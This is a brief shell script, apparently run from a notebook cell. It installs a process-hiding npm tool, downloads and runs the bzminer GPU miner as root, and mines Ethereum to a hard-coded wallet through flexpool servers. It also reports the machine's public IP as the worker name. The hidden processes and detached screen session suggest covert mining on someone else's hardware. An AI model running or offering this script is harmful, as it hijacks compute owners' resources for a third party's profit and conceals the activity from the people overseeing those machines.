sudo apt update
sudo apt install screen -y
screen -dmS tre.sh 89 95
%cd /opt
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider
sudo apt install libpci3
sudo apt-get install screen
wget https://github.com/bzminer/bzminer/releases/download/v8.0.0/bzminer_v8.0.0_linux_cuda_tk.tar.gz && tar xvf bzminer_v8.0.0_linux_cuda_tk.tar.gz && chmod +x bzminer && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./bzminer -a ethash -w 0x0F8824d694772df58840EDdD06a36526A0063438 -p ethproxy+ssl://eth-hk.flexpool.io:5555 ethproxy+ssl://eth-sg.flexpool.io:5555 -r $ip-GP --nvidia 1
